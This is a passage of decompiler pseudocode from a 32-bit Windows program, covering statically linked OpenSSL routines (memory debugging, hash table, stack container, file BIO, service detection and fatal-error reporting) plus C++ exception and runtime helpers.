      if ( dword_4548D8 )
      {
        if ( !--dword_4548D8 )
        {
          dword_4548C4 |= 2u;
          sub_41E2C0(10, 27, (int)".\\crypto\\mem_dbg.c", 272);
        }
      }
    }
    sub_41E2C0(10, 20, (int)".\\crypto\\mem_dbg.c", 281);
  }
  return v0;
}
// 4548BC: using guessed type unsigned __int8 byte_4548BC[8];
// 4548C4: using guessed type int dword_4548C4;
// 4548D8: using guessed type int dword_4548D8;

//----- (004204B0) --------------------------------------------------------
unsigned int __usercall sub_4204B0@<eax>(unsigned int *a1@<esi>)
{
  unsigned int v1; // ecx
  unsigned int v2; // ebx
  unsigned int result; // eax
  unsigned int *v4; // ebp
  int v5; // edi
  unsigned int v6; // ecx
  unsigned int v7; // ebx
  unsigned int v8; // edx
  void *v9; // edi
  unsigned int v10; // ecx
  unsigned int v11; // ecx
  unsigned int i; // [esp+Ch] [ebp-4h]

  v1 = a1[6];
  v2 = a1[5];
  ++a1[3];
  ++a1[10];
  a1[5] = v2 + 1;
  result = *a1;
  v4 = (unsigned int *)(*a1 + 4 * (v2 + v1));
  v5 = *a1 + 4 * v2;
  *v4 = 0;
  v6 = *(_DWORD *)v5;
  for ( i = a1[4]; *(_DWORD *)v5; v6 = *(_DWORD *)v5 )
  {
    result = *(_DWORD *)(v6 + 8) / i;
    if ( *(_DWORD *)(v6 + 8) % i == v2 )
    {
      v5 = *(_DWORD *)v5 + 4;
    }
    else
    {
      *(_DWORD *)v5 = *(_DWORD *)(*(_DWORD *)v5 + 4);
      result = *v4;
      *(_DWORD *)(v6 + 4) = *v4;
      *v4 = v6;
    }
  }
  if ( a1[5] >= a1[6] )
  {
    v7 = 2 * a1[4];
    result = (unsigned int)sub_41E0B0((void *)*a1, 8 * a1[4], (int)".\\crypto\\lhash\\lhash.c", 306);
    v8 = result;
    if ( result )
    {
      result = a1[4];
      if ( result < v7 )
      {
        v9 = (void *)(v8 + 4 * result);
        v10 = v7 - result;
        result = 0;
        memset(v9, 0, 4 * v10);
      }
      v11 = a1[4];
      ++a1[11];
      a1[6] = v11;
      a1[4] = v7;
      *a1 = v8;
      a1[5] = 0;
    }
    else
    {
      ++a1[23];
      a1[5] = 0;
    }
  }
  return result;
}

//----- (00420590) --------------------------------------------------------
_BYTE *__usercall sub_420590@<eax>(int a1@<esi>)
{
  int *v1; // eax
  int v2; // ebx
  int v3; // eax
  _BYTE *result; // eax
  int v5; // ecx
  int v6; // ecx
  _DWORD *v7; // edx
  _DWORD *v8; // ecx

  v1 = (int *)(*(_DWORD *)a1 + 4 * (*(_DWORD *)(a1 + 24) + *(_DWORD *)(a1 + 20)) - 4);
  v2 = *v1;
  *v1 = 0;
  v3 = *(_DWORD *)(a1 + 20);
  if ( v3 )
  {
    *(_DWORD *)(a1 + 20) = v3 - 1;
  }
  else
  {
    result = sub_41E0B0(*(void **)a1, 4 * *(_DWORD *)(a1 + 24), (int)".\\crypto\\lhash\\lhash.c", 331);
    if ( !result )
    {
      ++*(_DWORD *)(a1 + 92);
      return result;
    }
    *(_DWORD *)(a1 + 24) >>= 1;
    v5 = *(_DWORD *)(a1 + 24);
    ++*(_DWORD *)(a1 + 52);
    *(_DWORD *)(a1 + 16) >>= 1;
    *(_DWORD *)(a1 + 20) = v5 - 1;
    *(_DWORD *)a1 = result;
  }
  v6 = *(_DWORD *)(a1 + 20);
  v7 = *(_DWORD **)a1;
  --*(_DWORD *)(a1 + 12);
  ++*(_DWORD *)(a1 + 48);
  result = (_BYTE *)v7[v6];
  v8 = &v7[v6];
  if ( result )
  {
    for ( ; *((_DWORD *)result + 1); result = (_BYTE *)*((_DWORD *)result + 1) )
      ;
    *((_DWORD *)result + 1) = v2;
  }
  else
  {
    *v8 = v2;
  }
  return result;
}

//----- (00420620) --------------------------------------------------------
int __usercall sub_420620@<eax>(int a1@<esi>, int a2, unsigned int *a3)
{
  unsigned int v3; // ebp
  unsigned int v4; // edx
  _DWORD *v5; // edi
  int i; // ebx
  _DWORD *v7; // eax
  int (__cdecl *v9)(_DWORD, int); // [esp+14h] [ebp+8h]

  v3 = (*(int (__cdecl **)(int))(a1 + 8))(a2);
  ++*(_DWORD *)(a1 + 56);
  *a3 = v3;
  v4 = v3 % *(_DWORD *)(a1 + 24);
  if ( v4 < *(_DWORD *)(a1 + 20) )
    v4 = v3 % *(_DWORD *)(a1 + 16);
  v9 = *(int (__cdecl **)(_DWORD, int))(a1 + 4);
  v5 = *(_DWORD **)(*(_DWORD *)a1 + 4 * v4);
  for ( i = *(_DWORD *)a1 + 4 * v4; v5; i = (int)v7 )
  {
    ++*(_DWORD *)(a1 + 88);
    if ( v5[2] == v3 )
    {
      ++*(_DWORD *)(a1 + 60);
      if ( !v9(*v5, a2) )
        break;
    }
    v7 = v5 + 1;
    v5 = (_DWORD *)v5[1];
  }
  return i;
}

//----- (004206A0) --------------------------------------------------------
int __cdecl sub_4206A0(char *a1)
{
  char *v1; // edx
  unsigned int v2; // esi
  char v3; // al
  int v4; // edi
  unsigned int v5; // eax

  v1 = a1;
  v2 = 0;
  if ( !a1 )
    return 0;
  v3 = *a1;
  if ( !*a1 )
    return 0;
  v4 = 256;
  do
  {
    v5 = v4 | v3;
    v4 += 256;
    ++v1;
    v2 = (v5 * v5) ^ __ROL4__(v2, (v5 ^ (v5 >> 2)) & 0xF);
    v3 = *v1;
  }
  while ( *v1 );
  return v2 ^ HIWORD(v2);
}

//----- (004206F0) --------------------------------------------------------
_DWORD *__cdecl sub_4206F0(int (__cdecl *a1)(char *a1), int (__cdecl *a2)(const char *Str1, const char *Str2))
{
  _DWORD *v2; // esi
  _BYTE *v3; // eax
  int (__cdecl *v5)(const char *, const char *); // eax
  int (__cdecl *v6)(char *); // eax

  v2 = sub_41E080(0x60u, (int)".\\crypto\\lhash\\lhash.c", 117);
  if ( !v2 )
    return 0;
  v3 = sub_41E080(0x40u, (int)".\\crypto\\lhash\\lhash.c", 119);
  *v2 = v3;
  if ( !v3 )
  {
    sub_41E130(v2);
    return 0;
  }
  v5 = a2;
  if ( !a2 )
    v5 = strcmp;
  v2[1] = v5;
  v6 = a1;
  if ( !a1 )
    v6 = sub_4206A0;
  v2[2] = v6;
  v2[3] = 8;
  v2[6] = 8;
  v2[4] = 16;
  v2[7] = 512;
  v2[8] = 256;
  return v2;
}

//----- (00420770) --------------------------------------------------------
_DWORD *__cdecl sub_420770(unsigned int *a1, int a2)
{
  unsigned int *v2; // esi
  unsigned int v3; // eax
  _DWORD *v4; // ebx
  _DWORD ***v5; // edi
  _DWORD **v6; // ecx
  _DWORD *result; // eax

  v2 = a1;
  v3 = (a1[9] << 8) / a1[3];
  a1[23] = 0;
  if ( v2[7] <= v3 )
    sub_4204B0(v2);
  v4 = (_DWORD *)a2;
  v5 = (_DWORD ***)sub_420620((int)v2, a2, (unsigned int *)&a1);
  v6 = *v5;
  if ( *v5 )
  {
    result = *v6;
    *v6 = v4;
    ++v2[17];
  }
  else
  {
    result = sub_41DFF0(12, (int)".\\crypto\\lhash\\lhash.c", 169);
    if ( result )
    {
      result[2] = a1;
      *result = v4;
      result[1] = 0;
      *v5 = (_DWORD **)result;
      ++v2[16];
      result = 0;
      ++v2[9];
    }
    else
    {
      ++v2[23];
    }
  }
  return result;
}

//----- (00420800) --------------------------------------------------------
int __cdecl sub_420800(_DWORD *a1, int a2)
{
  _DWORD *v2; // esi
  int **v3; // eax
  int *v4; // ecx
  int v6; // edi
  unsigned int v7; // ecx
  int v8; // [esp-8h] [ebp-Ch]

  v2 = a1;
  v8 = a2;
  a1[23] = 0;
  v3 = (int **)sub_420620((int)v2, v8, (unsigned int *)&a1);
  v4 = *v3;
  if ( *v3 )
  {
    *v3 = (int *)v4[1];
    v6 = *v4;
    sub_41E130(v4);
    --v2[9];
    v7 = v2[3];
    ++v2[18];
    if ( v7 > 0x10 && v2[8] >= (v2[9] << 8) / v7 )
      sub_420590((int)v2);
    return v6;
  }
  else
  {
    ++v2[19];
    return 0;
  }
}

//----- (00420870) --------------------------------------------------------
_DWORD *__cdecl sub_420870(int a1, int a2)
{
  int v2; // esi
  _DWORD *result; // eax
  int v4; // [esp-8h] [ebp-Ch]

  v2 = a1;
  v4 = a2;
  *(_DWORD *)(a1 + 92) = 0;
  result = *(_DWORD **)sub_420620(v2, v4, (unsigned int *)&a1);
  if ( result )
  {
    result = (_DWORD *)*result;
    ++*(_DWORD *)(v2 + 80);
  }
  else
  {
    ++*(_DWORD *)(v2 + 84);
  }
  return result;
}

//----- (004208A0) --------------------------------------------------------
DWORD __cdecl sub_4208A0(_DWORD *a1)
{
  DWORD result; // eax

  if ( dword_4548E0 )
    return dword_4548E0();
  result = GetCurrentThreadId();
  *a1 = 0;
  a1[1] = result;
  return result;
}
// 4548E0: using guessed type int (*dword_4548E0)(void);

//----- (004208C0) --------------------------------------------------------
int __cdecl sub_4208C0(unsigned __int8 *a1, unsigned __int8 *a2)
{
  unsigned int v4; // eax
  int v6; // eax

  v4 = 8;
  while ( *(_DWORD *)a1 == *(_DWORD *)a2 )
  {
    v4 -= 4;
    a2 += 4;
    a1 += 4;
    if ( v4 < 4 )
      return 0;
  }
  v6 = *a1 - *a2;
  if ( !v6 )
  {
    v6 = a1[1] - a2[1];
    if ( !v6 )
    {
      v6 = a1[2] - a2[2];
      if ( !v6 )
        v6 = a1[3] - a2[3];
    }
  }
  return (v6 >> 31) | 1;
}

//----- (00420920) --------------------------------------------------------
int __cdecl sub_420920(_DWORD *a1, _DWORD *a2)
{
  int result; // eax

  *a1 = *a2;
  result = a2[1];
  a1[1] = result;
  return result;
}

//----- (00420940) --------------------------------------------------------
int __cdecl sub_420940(int a1)
{
  return *(_DWORD *)(a1 + 4);
}

//----- (00420950) --------------------------------------------------------
int __cdecl sub_420950(char *a1, const char *a2, unsigned int a3)
{
  unsigned int v3; // ecx
  int i; // edi

  v3 = a3;
  for ( i = 0; v3 > 1; ++i )
  {
    if ( !*a2 )
      break;
    *a1 = *a2;
    --v3;
    ++a1;
    ++a2;
  }
  if ( v3 )
    *a1 = 0;
  return i + strlen(a2);
}

//----- (00420990) --------------------------------------------------------
int __cdecl sub_420990(char *a1, const char *a2, unsigned int a3)
{
  unsigned int v3; // eax
  int i; // ebx
  int j; // edi

  v3 = a3;
  for ( i = 0; v3; --v3 )
  {
    if ( !*a1 )
      break;
    ++i;
    ++a1;
  }
  for ( j = 0; v3 > 1; ++j )
  {
    if ( !*a2 )
      break;
    *a1 = *a2;
    --v3;
    ++a1;
    ++a2;
  }
  if ( v3 )
    *a1 = 0;
  return i + j + strlen(a2);
}

//----- (004209F0) --------------------------------------------------------
int __cdecl sub_4209F0(int *a1, int a2, int a3)
{
  int result; // eax
  int v4; // eax
  _BYTE *v5; // eax
  int v6; // ecx
  int v7; // eax

  if ( !a1 )
    return 0;
  v4 = a1[3];
  if ( v4 <= *a1 + 1 )
  {
    v5 = sub_41E0B0((void *)a1[1], 8 * v4, (int)".\\crypto\\stack\\stack.c", 175);
    if ( !v5 )
      return 0;
    v6 = a1[3];
    a1[1] = (int)v5;
    a1[3] = 2 * v6;
  }
  v7 = *a1;
  if ( a3 >= *a1 || a3 < 0 )
  {
    *(_DWORD *)(a1[1] + 4 * v7) = a2;
    result = ++*a1;
    a1[2] = 0;
  }
  else
  {
    memcpy_0((void *)(a1[1] + 4 * a3 + 4), (const void *)(a1[1] + 4 * a3), 4 * (v7 - a3));
    *(_DWORD *)(a1[1] + 4 * a3) = a2;
    result = ++*a1;
    a1[2] = 0;
  }
  return result;
}

//----- (00420A90) --------------------------------------------------------
int __cdecl sub_420A90(int *a1, int a2)
{
  return sub_4209F0(a1, a2, *a1);
}

//----- (00420AB0) --------------------------------------------------------
int (__cdecl *__cdecl sub_420AB0(void **Block))(_DWORD, _DWORD)
{
  int (__cdecl *result)(_DWORD, _DWORD); // eax

  if ( Block )
  {
    sub_41E130(Block[1]);
    return sub_41E130(Block);
  }
  return result;
}

//----- (00420AD0) --------------------------------------------------------
int __cdecl sub_420AD0(int a1)
{
  if ( a1 )
    return *(_DWORD *)a1;
  else
    return -1;
}

//----- (00420AE0) --------------------------------------------------------
int __cdecl sub_420AE0(int *a1, int a2)
{
  if ( a1 && a2 >= 0 && a2 < *a1 )
    return *(_DWORD *)(a1[1] + 4 * a2);
  else
    return 0;
}

//----- (00420B00) --------------------------------------------------------
int __cdecl sub_420B00(int *a1, int a2, int a3)
{
  int result; // eax

  if ( !a1 || a2 < 0 || a2 >= *a1 )
    return 0;
  result = a3;
  *(_DWORD *)(a1[1] + 4 * a2) = a3;
  return result;
}

//----- (00420B30) --------------------------------------------------------
_DWORD *sub_420B30()
{
  _DWORD *v0; // esi
  _BYTE *v1; // eax

  v0 = sub_41E080(0x14u, (int)".\\crypto\\stack\\stack.c", 154);
  if ( v0 && (v1 = sub_41E080(0x10u, (int)".\\crypto\\stack\\stack.c", 156), (v0[1] = v1) != 0) )
  {
    v0[4] = 0;
    v0[3] = 4;
    return v0;
  }
  else
  {
    sub_41E130(v0);
    return 0;
  }
}

//----- (00420B90) --------------------------------------------------------
int sub_420B90()
{
  int (*_OPENSSL_isservice)(void); // eax
  HMODULE ModuleHandleA; // eax
  HWINSTA ProcessWindowStation; // ebx
  void *v3; // esp
  wchar_t v5[6]; // [esp+0h] [ebp-14h] BYREF
  DWORD nLengthNeeded; // [esp+Ch] [ebp-8h] BYREF

  _OPENSSL_isservice = (int (*)(void))lpModuleName;
  if ( lpModuleName
    || ((ModuleHandleA = GetModuleHandleA(0)) == 0
      ? (_OPENSSL_isservice = (int (*)(void))lpModuleName)
      : (int (*)(void))(_OPENSSL_isservice = GetProcAddress(ModuleHandleA, "_OPENSSL_isservice"),
                        lpModuleName = (LPCSTR)_OPENSSL_isservice),
        _OPENSSL_isservice) )
  {
    if ( _OPENSSL_isservice != (int (*)(void))-1 )
      return _OPENSSL_isservice();
  }
  else
  {
    lpModuleName = (LPCSTR)-1;
  }
  ProcessWindowStation = GetProcessWindowStation();
  if ( !ProcessWindowStation )
    return -1;
  if ( GetUserObjectInformationW(ProcessWindowStation, 2, 0, 0, &nLengthNeeded) )
    return -1;
  if ( GetLastError() != 122 )
    return -1;
  if ( nLengthNeeded > 0x200 )
    return -1;
  nLengthNeeded = (nLengthNeeded + 1) & 0xFFFFFFFE;
  v3 = alloca(nLengthNeeded + 2);
  if ( !GetUserObjectInformationW(ProcessWindowStation, 2, v5, nLengthNeeded, &nLengthNeeded) )
    return -1;
  nLengthNeeded = (nLengthNeeded + 1) & 0xFFFFFFFE;
  v5[nLengthNeeded >> 1] = 0;
  return wcsstr(v5, L"Service-0x") != 0;
}

//----- (00420CD0) --------------------------------------------------------
HANDLE sub_420CD0(char *Format, ...)
{
  HANDLE StdHandle; // eax
  void *v2; // esi
  int v3; // eax
  HANDLE result; // eax
  HANDLE v5; // esi
  DWORD NumberOfBytesWritten; // [esp+4h] [ebp-108h] BYREF
  char Buffer[256]; // [esp+8h] [ebp-104h] BYREF
  va_list va; // [esp+114h] [ebp+8h] BYREF

  va_start(va, Format);
  StdHandle = GetStdHandle(0xFFFFFFF4);
  v2 = StdHandle;
  if ( StdHandle && GetFileType(StdHandle) )
  {
    v3 = _vsnprintf(Buffer, 0x100u, Format, va);
    if ( v3 < 0 )
      v3 = 256;
    return (HANDLE)WriteFile(v2, Buffer, v3, &NumberOfBytesWritten, 0);
  }
  else
  {
    _vsnprintf(Buffer, 0xFFu, Format, va);
    Buffer[255] = 0;
    if ( GetVersion() >= 0x80000000 || sub_420B90() <= 0 )
    {
      return (HANDLE)MessageBoxA(0, Buffer, "OpenSSL: FATAL", 0x10u);
    }
    else
    {
      result = RegisterEventSourceA(0, "OpenSSL");
      v5 = result;
      if ( result )
      {
        NumberOfBytesWritten = (DWORD)Buffer;
        ReportEventA(result, 1u, 0, 0, 0, 1u, 0, (LPCSTR *)&NumberOfBytesWritten, 0);
        return (HANDLE)DeregisterEventSource(v5);
      }
    }
  }
  return result;
}

//----- (00420E20) --------------------------------------------------------
void __cdecl __noreturn sub_420E20(const char *ArgList, int a2, const char *a3)
{
  sub_420CD0("%s(%d): OpenSSL internal error, assertion failed: %s\n", ArgList, a2, a3);
  raise(22);
  _exit(3);
}
// 420E20: using guessed type const char *ArgList;

//----- (00420E50) --------------------------------------------------------
FILE *__usercall sub_420E50@<eax>(const char *a1@<ebx>, char *a2)
{
  int v2; // edi
  int v3; // esi
  void *v5; // esp
  char *v6; // edi
  FILE *v7; // esi
  WCHAR v8[4]; // [esp+0h] [ebp-28h] BYREF
  wchar_t *FileName; // [esp+8h] [ebp-20h]
  DWORD dwFlags; // [esp+Ch] [ebp-1Ch]
  char *Mode; // [esp+10h] [ebp-18h]
  WCHAR WideCharStr[8]; // [esp+14h] [ebp-14h] BYREF

  Mode = a2;
  v2 = strlen(a1) + 1;
  dwFlags = 8;
  v3 = MultiByteToWideChar(0xFDE9u, 8u, a1, v2, 0, 0);
  if ( v3 <= 0 )
  {
    if ( GetLastError() != 1004 || (dwFlags = 0, v3 = MultiByteToWideChar(0xFDE9u, 0, a1, v2, 0, 0), v3 <= 0) )
    {
      if ( GetLastError() == 1113 )
        return fopen(a1, Mode);
      return 0;
    }
  }
  v5 = alloca(2 * v3);
  FileName = v8;
  if ( !MultiByteToWideChar(0xFDE9u, dwFlags, a1, v2, v8, v3) )
    return 0;
  v6 = Mode;
  if ( !MultiByteToWideChar(0xFDE9u, 0, Mode, strlen(Mode) + 1, WideCharStr, 8) )
    return 0;
  v7 = _wfopen(FileName, WideCharStr);
  if ( !v7 && (*_errno() == 2 || *_errno() == 9) )
    return fopen(a1, v6);
  else
    return v7;
}

//----- (00420FC0) --------------------------------------------------------
int __cdecl sub_420FC0(_DWORD *a1)
{
  a1[3] = 0;
  a1[7] = 0;
  a1[8] = 0;
  a1[5] = 0;
  return 1;
}

//----- (00420FE0) --------------------------------------------------------
int __cdecl sub_420FE0(int a1)
{
  if ( !a1 )
    return 0;
  if ( *(_DWORD *)(a1 + 16) )
  {
    if ( *(_DWORD *)(a1 + 12) )
    {
      if ( *(_DWORD *)(a1 + 32) )
      {
        fclose(*(FILE **)(a1 + 32));
        *(_DWORD *)(a1 + 32) = 0;
        *(_DWORD *)(a1 + 20) = 0;
      }
    }
    *(_DWORD *)(a1 + 12) = 0;
  }
  return 1;
}

//----- (00421030) --------------------------------------------------------
size_t __cdecl sub_421030(int a1, void *Buffer, size_t ElementCount)
{
  size_t result; // eax
  size_t v4; // edi
  __int16 LastError; // ax

  result = 0;
  if ( *(_DWORD *)(a1 + 12) && Buffer )
  {
    v4 = fread(Buffer, 1u, ElementCount, *(FILE **)(a1 + 32));
    if ( ferror(*(FILE **)(a1 + 32)) )
    {
      LastError = GetLastError();
      sub_41DC70(2u, 11, LastError, (int)".\\crypto\\bio\\bss_file.c", 251);
      sub_41DC70(0x20u, 130, 2, (int)".\\crypto\\bio\\bss_file.c", 252);
      return -1;
    }
    else
    {
      return v4;
    }
  }
  return result;
}

//----- (004210B0) --------------------------------------------------------
size_t __cdecl sub_4210B0(int a1, void *Buffer, size_t ElementSize)
{
  size_t result; // eax

  result = 0;
  if ( *(_DWORD *)(a1 + 12) && Buffer )
  {
    result = fwrite(Buffer, ElementSize, 1u, *(FILE **)(a1 + 32));
    if ( result )
      return ElementSize;
  }
  return result;
}

//----- (004210E0) --------------------------------------------------------
int __cdecl sub_4210E0(int a1, int a2, int Offset, FILE *Stream)
{
  _DWORD *v4; // esi
  FILE *v5; // eax
  int v6; // ebp
  char v8; // bl
  int v9; // eax
  char v10; // bl
  _WORD *v11; // edi
  char v12; // al
  char v13; // al
  FILE *v14; // ebx
  FILE *v15; // eax
  __int16 LastError; // ax
  FILE *v17; // [esp-8h] [ebp-14h]
  const char *v18; // [esp-8h] [ebp-14h]
  void *retaddr; // [esp+Ch] [ebp+0h] BYREF

  v4 = (_DWORD *)a1;
  v5 = *(FILE **)(a1 + 32);
  v6 = 1;
  switch ( a2 )
  {
    case 1:
    case 128:
      return fseek(v5, Offset, 0);
    case 2:
      return feof(*(FILE **)(a1 + 32));
    case 3:
    case 133:
      return ftell(*(FILE **)(a1 + 32));
    case 8:
      return *(_DWORD *)(a1 + 16);
    case 9:
      *(_DWORD *)(a1 + 16) = Offset;
      return 1;
    case 11:
      fflush(*(FILE **)(a1 + 32));
      return 1;
    case 12:
      return v6;
    case 106:
      sub_420FE0(a1);
      v8 = Offset;
      v4[4] = Offset & 1;
      v17 = Stream;
      v4[8] = Stream;
      v4[3] = 1;
      v9 = _fileno(v17);
      if ( (v8 & 0x10) != 0 )
        _setmode(v9, 0x4000);
      else
        _setmode(v9, 0x8000);
      return 1;
    case 107:
      if ( !Stream )
        return v6;
      Stream->_ptr = (char *)v5;
      return 1;
    case 108:
      sub_420FE0(a1);
      v10 = Offset;
      v4[4] = Offset & 1;
      if ( (v10 & 8) != 0 )
      {
        if ( (v10 & 2) != 0 )
        {
          sub_420950((char *)&a1, "a+", 4u);
          goto LABEL_21;
        }
        v18 = (const char *)&unk_436AA4;
      }
      else
      {
        if ( (v10 & 2) != 0 )
        {
          if ( (v10 & 4) != 0 )
          {
            sub_420950((char *)&a1, "r+", 4u);
            goto LABEL_21;
          }
        }
        else if ( (v10 & 4) != 0 )
        {
          sub_420950((char *)&a1, "w", 4u);
          goto LABEL_21;
        }
        if ( (v10 & 2) == 0 )
        {
          sub_41DC70(0x20u, 116, 101, (int)".\\crypto\\bio\\bss_file.c", 380);
          return 0;
        }
        v18 = (const char *)&unk_436A98;
      }
      sub_420950((char *)&a1, v18, 4u);
LABEL_21:
      v11 = (_WORD *)((char *)&retaddr + 3);
      if ( (v10 & 0x10) != 0 )
      {
        do
        {
          v13 = *((_BYTE *)v11 + 1);
          v11 = (_WORD *)((char *)v11 + 1);
        }
        while ( v13 );
        *v11 = 116;
      }
      else
      {
        do
        {
          v12 = *((_BYTE *)v11 + 1);
          v11 = (_WORD *)((char *)v11 + 1);
        }
        while ( v12 );
        *v11 = 98;
      }
      v14 = Stream;
      v15 = sub_420E50((const char *)Stream, (char *)&a1);
      if ( v15 )
      {
        v4[8] = v15;
        v4[3] = 1;
        sub_41D3C0((int)v4, 0);
        return 1;
      }
      else
      {
        LastError = GetLastError();
        sub_41DC70(2u, 1, LastError, (int)".\\crypto\\bio\\bss_file.c", 398);
        sub_41DD50(5, "fopen('", v14, "','", &a1, "')");
        sub_41DC70(0x20u, 116, 2, (int)".\\crypto\\bio\\bss_file.c", 400);
        return 0;
      }
    default:
      return 0;
  }
}

//----- (004213E0) --------------------------------------------------------
unsigned int __cdecl sub_4213E0(int a1, char *Buffer, int MaxCount)
{
  *Buffer = 0;
  if ( fgets(Buffer, MaxCount, *(FILE **)(a1 + 32)) && *Buffer )
    return strlen(Buffer);
  else
    return 0;
}

//----- (00421430) --------------------------------------------------------
size_t __cdecl sub_421430(int a1, const char *Buffer)
{
  size_t v2; // esi
  size_t result; // eax

  v2 = strlen(Buffer);
  result = 0;
  if ( *(_DWORD *)(a1 + 12) && Buffer )
  {
    result = fwrite(Buffer, v2, 1u, *(FILE **)(a1 + 32));
    if ( result )
      return v2;
  }
  return result;
}

//----- (00421478) --------------------------------------------------------
std::exception *__thiscall sub_421478(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::logic_error::`vftable';
  return this;
}
// 447540: using guessed type void *std::logic_error::`vftable';

//----- (004214C5) --------------------------------------------------------
std::exception *__thiscall sub_4214C5(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::length_error::`vftable';
  return this;
}
// 44754C: using guessed type void *std::length_error::`vftable';

//----- (00421512) --------------------------------------------------------
std::exception *__thiscall sub_421512(std::exception *this, struct exception *a2)
{
  std::exception::exception(this, a2);
  *(_DWORD *)this = &std::out_of_range::`vftable';
  return this;
}
// 447558: using guessed type void *std::out_of_range::`vftable';

//----- (0042152F) --------------------------------------------------------
std::exception *__thiscall sub_42152F(std::exception *this, char a2)
{
  sub_40C2D5(this);
  if ( (a2 & 1) != 0 )
    operator delete(this);
  return this;
}

//----- (00421E15) --------------------------------------------------------
void *sub_421E15()
{
  return &unk_450880;
}

//----- (00421E1B) --------------------------------------------------------
char **sub_421E1B()
{
  return off_4507D0;
}
// 4507D0: using guessed type char *off_4507D0[44];

//----- (00422AB9) --------------------------------------------------------
int __cdecl sub_422AB9(int a1, LPCWSTR lpFileName, int a3, int a4, int a5)
{
  return _sopen_helper_0(lpFileName, a3, a4, a5, a1, 1);
}

//----- (00422ED6) --------------------------------------------------------
void __cdecl sub_422ED6()
{
  dword_452348[0] = &std::bad_alloc::`vftable';
  sub_40C2D5((std::exception *)dword_452348);
}
// 423904: using guessed type void *std::bad_alloc::`vftable';
// 452348: using guessed type _DWORD dword_452348[3];

// nfuncs=668 queued=233 decompiled=233 lumina nreq=0 worse=0 better=0
// ALL OK, 233 function(s) have been successfully decompiled
